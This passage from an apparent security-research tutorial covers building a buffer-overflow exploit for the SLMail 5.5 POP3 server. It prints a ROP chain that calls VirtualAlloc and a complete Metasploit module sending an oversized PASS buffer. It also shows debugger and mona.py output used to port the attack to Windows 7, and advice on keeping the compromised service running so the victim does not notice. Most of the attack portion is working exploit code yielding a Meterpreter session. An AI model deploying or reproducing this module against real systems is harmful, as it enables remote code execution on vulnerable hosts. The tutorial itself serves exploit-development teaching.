           ], self.class)
      end</code></pre>



<p>It is important to be very accurate with the “Space” and “BadChars” options for the payload, and specify in the target the Offset to control EIP and the address of the function we are going to use to get our shellcode.</p>



<p>All this information can be found in the file findmsp.txt. Be careful with the Space; you can see in the file we have 430 bytes for the payload, but the rop chain, the opcodes to move ESP away from the shellcode, and the padding we used to set up the stack properly use 98 bytes of space, so there are only 332 bytes left for the payload.</p>



<p>Next, we copy the function create_rop_chain() from the file rop_chains.txt that mona.py generated:</p>



<pre class="wp-block-code"><code>def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    &#91;
      0x77c4c5cd,  # POP EBP # RETN &#91;msvcrt.dll]
      0x77c4c5cd,  # skip 4 bytes &#91;msvcrt.dll]
      0x77c46e97,  # POP EBX # RETN &#91;msvcrt.dll]
      0xffffffff,  # 
      0x77c127e5,  # INC EBX # RETN &#91;msvcrt.dll]
      0x77c127e1,  # INC EBX # RETN &#91;msvcrt.dll]
      0x77c4debf,  # POP EAX # RETN &#91;msvcrt.dll]
      0x2cfe1467,  # put delta into eax (-&gt; put 0x00001000 into edx)
      0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
      0x77c58fbc,  # XCHG EAX,EDX # RETN &#91;msvcrt.dll]
      0x77c4e0da,  # POP EAX # RETN &#91;msvcrt.dll]
      0x2cfe04a7,  # put delta into eax (-&gt; put 0x00000040 into ecx)
      0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
      0x77c14001,  # XCHG EAX,ECX # RETN &#91;msvcrt.dll]
      0x77c2e93d,  # POP EDI # RETN &#91;msvcrt.dll]
      0x77c47a42,  # RETN (ROP NOP) &#91;msvcrt.dll]
      0x77c2eb03,  # POP ESI # RETN &#91;msvcrt.dll]
      0x77c2aacc,  # JMP &#91;EAX] &#91;msvcrt.dll]
      0x77c4ded4,  # POP EAX # RETN &#91;msvcrt.dll]
      0x77c1110c,  # ptr to &amp;VirtualAlloc() &#91;IAT msvcrt.dll]
      0x77c12df9,  # PUSHAD # RETN &#91;msvcrt.dll]
      0x77c35459,  # ptr to 'push esp # ret ' &#91;msvcrt.dll]
    ].flatten.pack(V*)

    return rop_gadgets

  end
</code></pre>



<p>Next we add the logic of our exploit to the exploit() function:</p>



<pre class="wp-block-code"><code>def exploit
                 
size = 6000 # buffer size
move_esp = \x81\xc4\xc0\xfd\xff\xff # add esp,-240h

                buffer = 'A' * target&#91;'OffSet'] # Padding
                buffer &lt;&lt; &#91;target.ret].pack('V') # EIP (pop ECX, ret)
                buffer &lt;&lt; \xff\xff\xff\xff    # Padding to put en ECX
                buffer &lt;&lt; create_rop_chain()
                buffer &lt;&lt; move_esp
                buffer &lt;&lt; payload.encoded
                buffer &lt;&lt; 'C' * (size-buffer.length) # Padding to buffer size
 
                connect()
                sock.get                 # Get the server banner
                sock.put(USER username \r\n)
                sock.get                 # Get the server response to command USER
                print_status(Sending Evil buffer...)
                sock.put(PASS +buffer+\r\n)
                handler()
                disconnect()

end</code></pre>



<p>And here is the final Metasploit exploit module:</p>



<pre class="wp-block-code"><code>require 'msf/core'
class Metasploit3 &lt; Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize
    super(
      'Name'          =&gt; 'SLMail 5.5 Pop3 Pass Exploit Module',
      'Description'   =&gt; 'This module exploits a buffer overflow when sending password on pop3 server',
      'Author'        =&gt; 'Nacho Sorribas',
      'Payload'       =&gt; {'Space' =&gt; 332, 'BadChars' =&gt; \x00\x0a\x0d},
      'Targets'       =&gt;
      &#91;
        &#91;'Windows XP SP3 English',
          {
        'Ret' =&gt; 0x77c46027, #0x77c46027 :  # POP ECX # RETN    ** &#91;msvcrt.dll] **
        'OffSet' =&gt; 4654,

          }
        ]
      ],
        'Platform'      =&gt; 'win',
    )
      register_options( &#91;
                       Opt::RPORT(110)
      ], self.class)
  end

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
      &#91;
        0x77c4c5cd,  # POP EBP # RETN &#91;msvcrt.dll]
        0x77c4c5cd,  # skip 4 bytes &#91;msvcrt.dll]
        0x77c46e97,  # POP EBX # RETN &#91;msvcrt.dll]
        0xffffffff,  # 
        0x77c127e5,  # INC EBX # RETN &#91;msvcrt.dll]
        0x77c127e1,  # INC EBX # RETN &#91;msvcrt.dll]
        0x77c4debf,  # POP EAX # RETN &#91;msvcrt.dll]
        0x2cfe1467,  # put delta into eax (-&gt; put 0x00001000 into edx)
        0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
        0x77c58fbc,  # XCHG EAX,EDX # RETN &#91;msvcrt.dll]
        0x77c4e0da,  # POP EAX # RETN &#91;msvcrt.dll]
        0x2cfe04a7,  # put delta into eax (-&gt; put 0x00000040 into ecx)
        0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
        0x77c14001,  # XCHG EAX,ECX # RETN &#91;msvcrt.dll]
        0x77c2e93d,  # POP EDI # RETN &#91;msvcrt.dll]
        0x77c47a42,  # RETN (ROP NOP) &#91;msvcrt.dll]
        0x77c2eb03,  # POP ESI # RETN &#91;msvcrt.dll]
        0x77c2aacc,  # JMP &#91;EAX] &#91;msvcrt.dll]
        0x77c4ded4,  # POP EAX # RETN &#91;msvcrt.dll]
        0x77c1110c,  # ptr to &amp;VirtualAlloc() &#91;IAT msvcrt.dll]
        0x77c12df9,  # PUSHAD # RETN &#91;msvcrt.dll]
        0x77c35459,  # ptr to 'push esp # ret ' &#91;msvcrt.dll]
    ].flatten.pack(V*)

    return rop_gadgets

  end

  # Connect to port, send the payload, handle it, disconnect
  def exploit

    size = 6000 # buffer size
    move_esp = \x81\xc4\xc0\xfd\xff\xff # add esp,-240h

    buffer = 'A' * target&#91;'OffSet'] # Padding
    buffer &lt;&lt; &#91;target.ret].pack('V') # EIP (pop ECX, ret)
    buffer &lt;&lt; \xff\xff\xff\xff                # Padding to put en ECX
    buffer &lt;&lt; create_rop_chain()
    buffer &lt;&lt; move_esp
    buffer &lt;&lt; payload.encoded
    buffer &lt;&lt; 'C' * (size-buffer.length) # Padding to buffer size
 
    connect()
    sock.get                             # Get the server banner
    sock.put(USER username \r\n)
    sock.get                             # Get the response to the command USER
    print_status(Sending Evil buffer...)
    sock.put(PASS +buffer+\r\n)
    handler()
    disconnect()
  end
end
</code></pre>



<p>Time to try the module. Start msfconsole, select the exploit, configure it, and launch it.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7752" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/16-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?fit=990%2C524&amp;ssl=1" data-orig-size="990,524" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="16" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?fit=300%2C159&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?fit=990%2C524&amp;ssl=1" loading="lazy" width="990" height="524" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=990%2C524&#038;ssl=1" alt class="wp-image-7752 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?w=990&amp;ssl=1 990w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=300%2C159&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=768%2C406&amp;ssl=1 768w" data-lazy-sizes="(max-width: 990px) 100vw, 990px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=990%2C524&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7752" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/16-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?fit=990%2C524&amp;ssl=1" data-orig-size="990,524" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="16" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?fit=300%2C159&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?fit=990%2C524&amp;ssl=1" loading="lazy" width="990" height="524" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=990%2C524&#038;ssl=1" alt="" class="wp-image-7752" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?w=990&amp;ssl=1 990w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=300%2C159&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/16.png?resize=768%2C406&amp;ssl=1 768w" sizes="(max-width: 990px) 100vw, 990px" data-recalc-dims="1" /></noscript></figure>



<p>We have a Meterpreter session, so the exploit is working fine (at least with the default options).</p>



<p>Let’s see the options of the exploit.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7753" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/17-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?fit=852%2C490&amp;ssl=1" data-orig-size="852,490" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="17" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?fit=300%2C173&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?fit=852%2C490&amp;ssl=1" loading="lazy" width="852" height="490" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=852%2C490&#038;ssl=1" alt class="wp-image-7753 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?w=852&amp;ssl=1 852w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=300%2C173&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=768%2C442&amp;ssl=1 768w" data-lazy-sizes="(max-width: 852px) 100vw, 852px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=852%2C490&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7753" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/17-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?fit=852%2C490&amp;ssl=1" data-orig-size="852,490" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="17" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?fit=300%2C173&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?fit=852%2C490&amp;ssl=1" loading="lazy" width="852" height="490" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=852%2C490&#038;ssl=1" alt="" class="wp-image-7753" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?w=852&amp;ssl=1 852w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=300%2C173&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/17.png?resize=768%2C442&amp;ssl=1 768w" sizes="(max-width: 852px) 100vw, 852px" data-recalc-dims="1" /></noscript></figure>



<p>The payload has an EXITFUNC option by default set to “process” ; this means when the session is closed the process is terminated, so the vulnerability could not be exploited again until the process restarts. The other option is to set EXITFUNC to “thread” (this one works only if the service attacked uses threads, and in this case a POP3 server does, like an HTTP server or an SMTP server); this means that when the session is closed the thread is terminated, but the main process is still working and the vulnerability could be exploited again. More importantly, the victim doesn’t notice the attack because the service is working normally.</p>



<p>Let’s try to change the EXITFUNC to “thread” and exploit the box again:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7754" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/18-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?fit=684%2C148&amp;ssl=1" data-orig-size="684,148" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="18" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?fit=300%2C65&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?fit=684%2C148&amp;ssl=1" loading="lazy" width="684" height="148" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?resize=684%2C148&#038;ssl=1" alt class="wp-image-7754 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?w=684&amp;ssl=1 684w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?resize=300%2C65&amp;ssl=1 300w" data-lazy-sizes="(max-width: 684px) 100vw, 684px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?resize=684%2C148&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7754" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/18-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?fit=684%2C148&amp;ssl=1" data-orig-size="684,148" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="18" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?fit=300%2C65&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?fit=684%2C148&amp;ssl=1" loading="lazy" width="684" height="148" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?resize=684%2C148&#038;ssl=1" alt="" class="wp-image-7754" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?w=684&amp;ssl=1 684w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/18.png?resize=300%2C65&amp;ssl=1 300w" sizes="(max-width: 684px) 100vw, 684px" data-recalc-dims="1" /></noscript></figure>



<p>The exploit fails because none of the encoders could encode the payload in the space available. Remember we only have 332 bytes for the payload, and this is not enough space.</p>



<p>We can get four extra bytes if we change the EIP gadget for 0x77c34281 (#0x77c34281 :&nbsp; # INC EAX # RETN&nbsp;&nbsp;&nbsp; ** [msvcrt.dll] **) and leave the padding we use to put in ECX, but this is not enough.</p>



<p>Let’s try to find more space available. First we check out the findmsp.txt file to look for a better place for the shellcode:</p>



<pre class="wp-block-code"><code>&#91;+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x015118e8 (length 6000 bytes)
    EIP contains normal pattern : 0x7a46317a (offset 4654)
    ESP (0x01cea154) points at offset 4658 in normal pattern (length 430)
    EBP contains normal pattern : 0x46307a46 (offset 4650)
&#91;+] Examining SEH chain
&#91;+] Examining stack (entire stack) - looking for cyclic pattern
    Walking stack from 0x01ce8000 to 0x01cefffc (0x00007ffc bytes)
    0x01ce8fe4 : Contains normal cyclic pattern at ESP-0x1170 (-4464) : offset 4092, length 996 (-&gt; 0x01ce93c7 : ESP-0xd8c)
    0x01ce9f20 : Contains normal cyclic pattern at ESP-0x234 (-564) : offset 4094, length 994 (-&gt; 0x01cea301 : ESP+0x1ae)
    0x01ceab14 : Contains normal cyclic pattern at ESP+0x9c0 (+2496) : offset 4092, length 996 (-&gt; 0x01ceaeF7 : ESP+0xda4)
    0x01cecf1c : Contains normal cyclic pattern at ESP+0x2dc8 (+11720) : offset 4092, length 996 (-&gt; 0x01ced2ff : ESP+0x31ac)
&#91;+] Examining stack (entire stack) - looking for pointers to cyclic pattern</code></pre>



<p>Here we have a good candidate highlighted in red. On the offset 4092 we have 996 bytes, but remember EIP was at offset 4654 so if we don’t want to corrupt our exploit, only 562 bytes can be used for the shellcode; this is still much better than the previous 332 bytes.</p>



<p>The new approach would be to use the 430 bytes after the EIP for the rop chain and then make a jump backwards to offset 4092, where we have 562 bytes more.</p>



<p>We will see this later; first let’s try to port the exploit to Windows 7.</p>



<h2>Windows7 exploit (Python version)</h2>



<p>For the demo, we used 64-bit Windows7 Professional with SLMAIL 5.5 installed.</p>



<p>We launched the poc2.py exploit, the one with the Metasploit cyclic pattern to make the application crash.</p>



<p>We then used mona.py to find the pattern in memory. Here is some of the output:</p>



<pre class="wp-block-code"><code>================================================================================
  Output generated by mona.py v2.0, rev 557 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : SLmail (pid 3224)
  Current mona arguments: findmsf
================================================================================
  2015-06-03 13:08:07
================================================================================
----------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp; Path
----------------------------------------------------------------------------------------------------------------------------------
 0x73f10000 | 0x73F76000 | 0x00066000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 &#91;MSVCP60.dll] (C:\Windows\system32\MSVCP60.dll)
 &#91;…]
 0x10000000 | 0x10007000 | 0x00007000 | False  | False   | False |  False   | True   | 4.3.0.2 &#91;Openc32.dll] (C:\Windows\system32\Openc32.dll)
 &#91;…]
 0x00400000 | 0x0045c000 | 0x0005c000 | False  | False   | False |  False   | False  | 5.1 &#91;SLmail.exe] (C:\Program Files (x86)\SLmail\SLmail.exe)
&#91;…]
 0x5f400000 | 0x5f4f4000 | 0x000f4000 | False  | False   | False |  False   | True   | 6.00.8063.0 &#91;SLMFC.DLL] (C:\Windows\system32\SLMFC.DLL)
 &#91;…]
 0x5fd00000 | 0x5fd0e000 | 0x0000e000 | False  | False   | False |  False   | True   | 6.00.8168.0 &#91;MFC42LOC.DLL] (C:\Windows\system32\MFC42LOC.DLL)
 &#91;…]
----------------------------------------------------------------------------------------------------------------------------------
&#91;+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x01f100e0 (length 6000 bytes)
    EIP contains normal pattern : 0x7a46317a (offset 4654)
    ESP (0x01cea128) points at offset 4658 in normal pattern (length 430)
    EBP contains normal pattern : 0x46307a46 (offset 4650)
    EDX (0x01cea2d0) points at offset 5082 in normal pattern (length 6)
&#91;+] Examining SEH chain
&#91;+] Examining stack (entire stack) - looking for cyclic pattern
&#91;…]</code></pre>



<p>As can be seen highlighted in red, we can extract certain information from this file.</p>



<p>First we need to look for a module that doesn’t have ASLR or Rebase.</p>



<p>ASLR is a technique that randomizes the base address where the module loads in memory on every box reboot. Rebase is a technique to avoid multiple modules to be loaded at the same address in the process’ memory space. These two techniques make memory addresses unreliable to use in exploits.</p>



<p>In this case, we have three modules in memory with no ASLR or Rebase we can use to find the instructions or gadgets needed for our exploit.</p>



<p>We can see in the file output that the offset to control EIP is the same as the one in the Windows XP exploit.</p>



<p>So we need a jmp esp instruction inside one of the modules mentioned before to make the former exploit work.</p>



<p>We can use mona.py to find this instruction:</p>



<pre class="wp-block-code"><code>!mona jmp -r esp -m mfc42loc.dll,slmfc.dll,Openc32.dll
</code></pre>



<figure class="wp-block-image size-large"><img data-attachment-id="7755" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/19/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?fit=752%2C227&amp;ssl=1" data-orig-size="752,227" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="19" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?fit=300%2C91&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?fit=752%2C227&amp;ssl=1" loading="lazy" width="752" height="227" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?resize=752%2C227&#038;ssl=1" alt class="wp-image-7755 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?w=752&amp;ssl=1 752w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?resize=300%2C91&amp;ssl=1 300w" data-lazy-sizes="(max-width: 752px) 100vw, 752px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?resize=752%2C227&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7755" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/19/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?fit=752%2C227&amp;ssl=1" data-orig-size="752,227" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="19" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?fit=300%2C91&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?fit=752%2C227&amp;ssl=1" loading="lazy" width="752" height="227" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?resize=752%2C227&#038;ssl=1" alt="" class="wp-image-7755" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?w=752&amp;ssl=1 752w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/19.png?resize=300%2C91&amp;ssl=1 300w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1" /></noscript></figure>



<p>As can be seen, mona.py does not find any pointer to jmp esp in any of the analyzed modules.</p>



<p>There could be some instructions in the DLLs that mona.py could not find, so let’s try another approach using objdump just to make sure.</p>



<p>The SLMFC.DLL was copied to a Linux box and then analysed:</p>



<pre class="wp-block-code"><code>root@kali:/#objdump -D slmfc.DLL | grep jmp | grep esp</code></pre>



<figure class="wp-block-image size-large"><img data-attachment-id="7756" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/20/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?fit=886%2C226&amp;ssl=1" data-orig-size="886,226" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?fit=300%2C77&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?fit=886%2C226&amp;ssl=1" loading="lazy" width="886" height="226" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=886%2C226&#038;ssl=1" alt class="wp-image-7756 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?w=886&amp;ssl=1 886w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=300%2C77&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=768%2C196&amp;ssl=1 768w" data-lazy-sizes="(max-width: 886px) 100vw, 886px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=886%2C226&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7756" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/20/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?fit=886%2C226&amp;ssl=1" data-orig-size="886,226" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?fit=300%2C77&amp;ssl=1" 